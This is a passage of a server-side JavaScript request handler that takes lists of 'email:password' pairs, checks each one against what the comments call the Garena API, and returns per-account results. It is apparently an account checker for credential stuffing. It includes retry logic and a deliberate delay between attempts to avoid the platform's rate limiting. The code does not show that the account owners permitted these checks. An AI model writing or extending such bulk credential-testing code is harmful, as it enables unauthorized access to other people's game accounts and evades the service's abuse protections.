        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Limit accounts per request to prevent abuse
    if (accounts.length > MAX_ACCOUNTS_PER_REQUEST) {
      console.log(`[LIMIT] Request exceeded max accounts: ${accounts.length}/${MAX_ACCOUNTS_PER_REQUEST}`);
      return new Response(
        JSON.stringify({ 
          error: "Too many accounts", 
          message: `Maximum ${MAX_ACCOUNTS_PER_REQUEST} accounts per request. You sent ${accounts.length}.`
        }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    console.log(`[PROCESS] Processing ${accounts.length} accounts for client ${clientId}`);

    // Process accounts one by one with retry logic
    const results = [];
    for (const acc of accounts) {
      const [account, password] = acc.split(':');
      if (!account || !password) {
        results.push({ status: 'error', message: 'Invalid format (use email:password)', account: acc });
        continue;
      }
      
      try {
        const result = await withRetry(
          () => checkAccount(account.trim(), password.trim()),
          2,
          `Check account ${account}`
        );
        results.push(result);
        console.log(`[RESULT] ${account}: ${result.status}`);
      } catch (error) {
        console.error(`[ERROR] Failed to check ${account} after retries:`, error);
        results.push({ 
          status: 'error', 
          message: 'Failed after multiple retries', 
          account: account.trim() 
        });
      }
      
      // Delay between accounts to avoid rate limiting from Garena API
      await new Promise(resolve => setTimeout(resolve, 1500));
    }

    console.log(`[COMPLETE] Processed ${results.length} accounts for client ${clientId}`);

    return new Response(
      JSON.stringify({ 
        results,
        processed: results.length,
        timestamp: new Date().toISOString()
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("[ERROR] Request failed:", error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
